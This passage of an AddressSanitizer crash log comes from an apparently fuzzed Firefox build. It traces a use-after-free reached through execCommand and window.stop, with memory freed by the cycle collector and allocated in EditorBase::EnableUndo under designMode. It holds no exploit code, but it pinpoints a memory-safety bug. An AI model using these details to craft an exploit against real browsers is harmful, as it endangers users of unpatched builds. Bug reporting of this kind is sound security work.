#15 0x7f278c0aeef3 in DoCommandWithParams /home/worker/workspace/build/src/dom/commandhandler/nsBaseCommandController.cpp:152:25 #16 0x7f278c0aeef3 in non-virtual thunk to nsBaseCommandController::DoCommandWithParams(char const*, nsICommandParams*) /home/worker/workspace/build/src/dom/commandhandler/nsBaseCommandController.cpp:140 #17 0x7f278c0b50bb in nsCommandManager::DoCommand(char const*, nsICommandParams*, mozIDOMWindowProxy*) /home/worker/workspace/build/src/dom/commandhandler/nsCommandManager.cpp:212:29 #18 0x7f278c5fa045 in nsHTMLDocument::ExecCommand(nsAString const&, bool, nsAString const&, nsIPrincipal&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:3336:18 #19 0x7f278bb531ac in mozilla::dom::HTMLDocumentBinding::execCommand(JSContext*, JS::Handle<JSObject*>, nsHTMLDocument*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLDocumentBinding.cpp:835:21 #20 0x7f278bdf313e in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2953:13 #21 0x7f27915c3e53 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #22 0x7f27915c3e53 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:454 #23 0x7f27915ac698 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:505:12 #24 0x7f27915ac698 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2998 #25 0x7f27915925fe in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:394:12 #26 0x7f27915c3fd8 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:472:15 #27 0x7f27915c4802 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:518:10 #28 0x7f27921ce96e in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #29 0x7f2792185164 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:353:23 #30 0x7f27921aee83 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:464:21 #31 0x7f27921b17e7 in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:716:12 #32 0x7f27915c41a3 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #33 0x7f27915c41a3 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:436 #34 0x7f27915c4802 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:518:10 #35 0x7f2791f4142b in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2887:12 #36 0x7f278b895c95 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37 #37 0x7f278c1f8c9b in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:362:12 #38 0x7f278c1f8c9b in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:215 #39 0x7f278c1c5022 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1123:51 #40 0x7f278c1c6f0f in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1296:20 #41 0x7f278c1b2771 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:466:16 #42 0x7f278c1b5af8 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:827:9 #43 0x7f278e227300 in mozilla::PresShell::FireResizeEvent() /home/worker/workspace/build/src/layout/base/PresShell.cpp:2052:5 #44 0x7f278e23c850 in mozilla::PresShell::DoFlushPendingNotifications(mozilla::ChangesToFlush) /home/worker/workspace/build/src/layout/base/PresShell.cpp:4139:7 #45 0x7f278a536c21 in FlushPendingNotifications /home/worker/workspace/build/src/obj-firefox/dist/include/nsIPresShell.h:599:5 #46 0x7f278a536c21 in nsDocument::FlushPendingNotifications(mozilla::FlushType) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8023 #47 0x7f278a536b18 in nsDocument::FlushPendingNotifications(mozilla::FlushType) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8019:22 #48 0x7f2789529f0b in nsDocLoader::DocLoaderIsEmpty(bool) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:685:14 #49 0x7f278952c1e2 in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:614:5 #50 0x7f278952cf0c in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:470:14 #51 0x7f2787e3f9f2 in mozilla::net::nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:635:28 #52 0x7f2787e3bea3 in mozilla::net::nsLoadGroup::Cancel(nsresult) /home/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:271:15 #53 0x7f278952999f in nsDocLoader::Stop() /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:245:22 #54 0x7f278952981c in nsDocLoader::Stop() /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:242:3 #55 0x7f27906440c9 in Stop /home/worker/workspace/build/src/docshell/base/nsDocShell.h:190:25 #56 0x7f27906440c9 in nsDocShell::Stop(unsigned int) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:5566 #57 0x7f279069f9af in non-virtual thunk to nsDocShell::Stop(unsigned int) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:5530:13 #58 0x7f278a22700b in nsGlobalWindow::StopOuter(mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:7906:22 #59 0x7f278b604f2c in mozilla::dom::WindowBinding::stop(JSContext*, JS::Handle<JSObject*>, nsGlobalWindow*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:1965:9 #60 0x7f278b604080 in mozilla::dom::WindowBinding::genericMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:15658:13 #61 0x7f27915c3e53 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #62 0x7f27915c3e53 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:454 #63 0x7f27915c4802 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:518:10 #64 0x7f27921ce96e in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #65 0x7f2792185164 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:353:23 #66 0x7f27921aee83 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:464:21 #67 0x7f27921b17e7 in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:716:12 #68 0x7f27915c41a3 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #69 0x7f27915c41a3 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:436 #70 0x7f27915ac698 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:505:12 #71 0x7f27915ac698 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2998 #72 0x7f27915925fe in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:394:12 #73 0x7f27915c3fd8 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:472:15 #74 0x7f27915c4802 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:518:10 #75 0x7f2791f4142b in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2887:12 #76 0x7f278b898b97 in mozilla::dom::EventListener::HandleEvent(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventListenerBinding.cpp:47:8 #77 0x7f278c1c4fe8 in HandleEvent<mozilla::dom::EventTarget *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventListenerBinding.h:65:12 #78 0x7f278c1c4fe8 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1120 #79 0x7f278c1c6f0f in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1296:20 #80 0x7f278c1b2771 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:466:16 #81 0x7f278c1b5af8 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:827:9 #82 0x7f278a1f32e7 in nsGlobalWindow::PostHandleEvent(mozilla::EventChainPostVisitor&) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:3919:7 #83 0x7f278c1b2867 in PostHandleEvent /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:417:12 #84 0x7f278c1b2867 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:469 #85 0x7f278c1b2dec in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:519:5 #86 0x7f278c1b5af8 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:827:9 #87 0x7f278e31182c in nsDocumentViewer::LoadComplete(nsresult) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1043:7 #88 0x7f27906b6f49 in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7671:21 #89 0x7f27906b31a8 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7465:7 #90 0x7f27906ba2ff in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7362:13 #91 0x7f278952e519 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1258:3 #92 0x7f278952d4cc in nsDocLoader::doStopDocumentLoad(nsIRequest*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:842:14 #93 0x7f278952a368 in nsDocLoader::DocLoaderIsEmpty(bool) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:732:9 #94 0x7f278952c1e2 in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:614:5 #95 0x7f278952cf0c in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:470:14 #96 0x7f2787e3f9f2 in mozilla::net::nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:635:28 #97 0x7f278a53dc0b in nsDocument::DoUnblockOnload() /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8879:18 #98 0x7f278a53d7dc in nsDocument::UnblockOnload(bool) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8805:9 #99 0x7f278a51439d in nsDocument::DispatchContentLoadedEvents() /home/worker/workspace/build/src/dom/base/nsDocument.cpp:5279:3 #100 0x7f278a5df1a2 in applyImpl<nsDocument, void (nsDocument::*)()> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:855:12 #101 0x7f278a5df1a2 in apply<nsDocument, void (nsDocument::*)()> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:861 #102 0x7f278a5df1a2 in mozilla::detail::RunnableMethodImpl<nsDocument*, void (nsDocument::*)(), true, false>::Run() /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:890 #103 0x7f2787c5db31 in mozilla::ValidatingDispatcher::Runnable::Run() /home/worker/workspace/build/src/xpcom/threads/Dispatcher.cpp:259:32 #104 0x7f2787c8fb30 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1269:14 #105 0x7f2787c8c578 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #106 0x7f2788a2eed1 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #107 0x7f2788990480 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #108 0x7f2788990480 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #109 0x7f2788990480 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #110 0x7f278db3530f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27 #111 0x7f2791177367 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:871:22 #112 0x7f2788990480 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #113 0x7f2788990480 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #114 0x7f2788990480 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #115 0x7f2791176d7b in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:695:34 #116 0x4eb5c3 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:30 #117 0x4eb5c3 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:286 #118 0x7f27a323082f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291 #119 0x41cf18 in _start (/home/nils/fuzzer3/firefox/firefox+0x41cf18) 0x614000142c60 is located 32 bytes inside of 392-byte region [0x614000142c40,0x614000142dc8) freed by thread T0 (Web Content) here: #0 0x4bb44b in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:47:3 #1 0x7f2787b3c357 in SnowWhiteKiller::~SnowWhiteKiller() /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2664:25 #2 0x7f2787b3bf57 in nsCycleCollector::FreeSnowWhite(bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2839:3 #3 0x7f2787b42f7d in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3839:3 #4 0x7f2787b427a1 in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3661:9 #5 0x7f2787b45538 in nsCycleCollector_collect(nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:4157:21 #6 0x7f278a61bc18 in nsJSContext::CycleCollectNow(nsICycleCollectorListener*, int) /home/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1452:3 #7 0x7f278a193c5d in nsDOMWindowUtils::CycleCollect(nsICycleCollectorListener*, int) /home/worker/workspace/build/src/dom/base/nsDOMWindowUtils.cpp:1339:3 #8 0x7f2787caa1f1 in NS_InvokeByIndex /home/worker/workspace/build/src/xpcom/reflect/xptcall/md/unix/xptcinvoke_asm_x86_64_unix.S:115 #9 0x7f278934f784 in Invoke /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:2010:12 #10 0x7f278934f784 in Call /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1329 #11 0x7f278934f784 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1296 #12 0x7f278935692c in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:983:12 #13 0x7f27915c3e53 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #14 0x7f27915c3e53 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:454 #15 0x7f27915ac698 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:505:12 #16 0x7f27915ac698 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2998 #17 0x7f27915925fe in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:394:12 #18 0x7f27915c3fd8 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:472:15 #19 0x7f27915c4802 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:518:10 #20 0x7f2791f3f723 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2828:12 #21 0x7f278929946b in xpc::FunctionForwarder(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/ExportHelpers.cpp:319:18 #22 0x7f27915c3e53 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #23 0x7f27915c3e53 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:454 #24 0x7f27915c4802 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:518:10 #25 0x7f27921ce96e in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #26 0x7f2792185164 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:353:23 #27 0x7f27921aee83 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:464:21 #28 0x7f27921b17e7 in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:716:12 #29 0x7f27915c41a3 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #30 0x7f27915c41a3 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:436 #31 0x7f27915ac698 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:505:12 #32 0x7f27915ac698 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2998 #33 0x7f27915925fe in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:394:12 #34 0x7f27915c3fd8 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:472:15 #35 0x7f27915c4802 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:518:10 #36 0x7f2791f4142b in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2887:12 previously allocated by thread T0 (Web Content) here: #0 0x4bb79c in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64:3 #1 0x4ec75d in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7f278dc65a8b in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7f278dc65a8b in mozilla::EditorBase::EnableUndo(bool) /home/worker/workspace/build/src/editor/libeditor/EditorBase.cpp:759 #4 0x7f278dddfac1 in EndEditorInit /home/worker/workspace/build/src/editor/libeditor/TextEditor.cpp:221:3 #5 0x7f278dddfac1 in mozilla::AutoEditInitRulesTrigger::~AutoEditInitRulesTrigger() /home/worker/workspace/build/src/editor/libeditor/TextEditUtils.cpp:109 #6 0x7f278dd3ce59 in mozilla::HTMLEditor::Init(nsIDOMDocument*, nsIContent*, nsISelectionController*, unsigned int, nsAString const&) /home/worker/workspace/build/src/editor/libeditor/HTMLEditor.cpp:316:3 #7 0x7f278de39b24 in nsEditingSession::SetupEditorOnWindow(mozIDOMWindowProxy*) /home/worker/workspace/build/src/editor/composer/nsEditingSession.cpp:454:16 #8 0x7f278de368c0 in nsEditingSession::MakeWindowEditable(mozIDOMWindowProxy*, char const*, bool, bool, bool) /home/worker/workspace/build/src/editor/composer/nsEditingSession.cpp:173:10 #9 0x7f278c5e67d0 in nsHTMLDocument::EditingStateChanged() /home/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:2843:25 #10 0x7f278c5faded in SetDesignMode /home/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:2956:10 #11 0x7f278c5faded in nsHTMLDocument::SetDesignMode(nsAString const&, nsIPrincipal&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:2939 #12 0x7f278bb573d7 in mozilla::dom::HTMLDocumentBinding::set_designMode(JSContext*, JS::Handle<JSObject*>, nsHTMLDocument*, JSJitSetterCallArgs) /home/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLDocumentBinding.cpp:757:9 #13 0x7f278bdf29dc in mozilla::dom::GenericBindingSetter(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2921:8 #14 0x7f27915c3e53 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #15 0x7f27915c3e53 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:454 #16 0x7f27915c5b69 in InternalCall /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:499:12 #17 0x7f27915c5b69 in Call /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:518 #18 0x7f27915c5b69 in js::CallSetter(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::Handle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:647 #19 0x7f2792458f1a in SetExistingProperty /home/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2473:10 #20 0x7f2792458f1a in js::NativeSetProperty(JSContext*, JS::Handle<js::NativeObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::QualifiedBool, JS::ObjectOpResult&) /home/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2508 #21 0x7f279217bbda in SetProperty /home/worker/workspace/build/src/js/src/vm/NativeObject.h:1460:12 #22 0x7f279217bbda in js::SetPropertyIgnoringNamedGetter(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::Handle<JS::PropertyDescriptor>, JS::ObjectOpResult&) /home/worker/workspace/build/src/js/src/proxy/BaseProxyHandler.cpp:182 #23 0x7f278bdfde54 in mozilla::dom::DOMProxyHandler::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) const /home/worker/workspace/build/src/dom/bindings/DOMJSProxyHandler.cpp:258:10 #24 0x7f27921acef1 in js::Proxy::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:369:21 #25 0x7f279209d19d in JSObject::nonNativeSetProperty(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) /home/worker/workspace/build/src/js/src/jsobj.cpp:1049:12 #26 0x7f27915a599c in SetProperty /home/worker/workspace/build/src/js/src/vm/NativeObject.h:1459:16 #27 0x7f27915a599c in SetPropertyOperation /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:243 #28 0x7f27915a599c in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2789 #29 0x7f27915925fe in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:394:12 #30 0x7f27915c3fd8 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs 